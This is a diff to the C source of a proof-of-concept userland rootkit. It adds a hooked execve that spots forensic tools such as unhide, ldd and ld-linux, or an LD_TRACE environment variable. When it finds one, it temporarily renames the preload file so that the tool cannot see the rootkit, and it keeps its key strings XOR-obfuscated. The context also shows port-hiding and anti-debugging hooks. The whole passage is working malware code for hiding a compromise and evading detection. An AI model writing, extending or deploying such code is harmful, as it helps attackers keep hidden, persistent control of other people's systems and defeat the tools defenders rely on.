@@ -255,6 +255,71 @@ FILE *hide_ports(const char *filename) {
     return tmp;
 }
 
+// Hooked execve function to create a temporary “sandbox process” to execute binaries without the rootkit loaded
+int execve(const char *path, char *const argv[], char *const envp[]) {
+    DEBUG("[rootkit-poc]: execve hooked %s\n", path);
+
+    char *unhide = strdup(C_UNHIDE);
+    char *ldd = strdup(C_LDD);
+    char *ld_linux = strdup(LD_LINUX);
+    char *ld_trace = strdup(LD_TRACE);
+
+    xor(ld_trace);
+
+    char *trace_var = getenv(ld_trace);
+
+    cleanup(ld_trace, strlen(ld_trace));
+
+    int pid, ret;
+
+    init(); // hook configurations
+
+    xor(unhide);
+    xor(ldd);
+    xor(ld_linux);
+
+    // If the path corresponds to certain debugging or analysis tools
+    if (strstr(path, unhide) || strstr(path, ldd) || strstr(path, ld_linux) || trace_var != NULL) {
+        char *ld_normal = strdup(LD_NORMAL);
+        char *ld_hide = strdup(LD_HIDE);
+
+        xor(ld_normal);
+        xor(ld_hide);
+
+        rename(ld_normal, ld_hide); // rename the ld file to hide it
+
+        // Create a new process
+        if ((pid = fork()) == -1) {
+            cleanup(ld_normal, strlen(ld_normal));
+            cleanup(ld_hide, strlen(ld_hide));
+            return -1;
+        } else if (pid == 0) {
+            cleanup(ld_normal, strlen(ld_normal));
+            cleanup(ld_hide, strlen(ld_hide));
+
+            // The child process runs the program without the rootkit ld loaded
+            return (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, NULL);
+        } else {
+            wait(&ret); // the main process is waiting for the child process to finish
+        }
+
+        // Restore the ld
+        rename(ld_hide, ld_normal);
+
+        cleanup(ld_normal, strlen(ld_normal));
+        cleanup(ld_hide, strlen(ld_hide));
+    } else {
+        // Calls the original execve function if it's not debugging
+        ret = (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
+    }
+
+    cleanup(unhide, strlen(unhide));
+    cleanup(ldd, strlen(ldd));
+    cleanup(ld_linux, strlen(ld_linux));
+
+    exit(ret); // exit with the return value of the original execve function
+}
+
 // Hooked ptrace function to exit on debug
 long ptrace(void *request, pid_t pid, void *addr, void *data) {
     char *anti_debug_msg = strdup(ANTI_DEBUG_MSG);
